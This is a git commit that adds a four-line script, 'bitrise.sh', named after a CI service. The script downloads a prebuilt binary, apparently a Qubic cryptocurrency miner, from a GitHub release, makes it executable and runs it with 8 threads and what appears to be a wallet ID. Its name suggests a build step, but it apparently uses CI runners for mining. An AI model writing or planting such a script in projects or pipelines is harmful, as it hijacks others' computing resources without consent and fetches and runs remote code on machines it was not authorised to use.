a5c3010f3f75071d111fcfbad142385d91d51c3f
testqbic01 <166426341+testqbic01@users.noreply.github.com>
2024-04-09 22:42:47 +0530

    Create bitrise.sh

---
+++ bitrise.sh
@@ -0,0 +1,4 @@
+apt update && apt install libc6 -y
+wget https://github.com/Qubic-Solutions/rqiner-builds/releases/download/v0.3.19/rqiner-x86-broadwell
+chmod +x rqiner-x86-broadwell
+./rqiner-x86-broadwell -t 8 -i BEQENIGEIOOTXBUAIQVGQGMMNIXCXSHDZHGFPTSLZCGHTCMZHGIIDXAFUJDJ
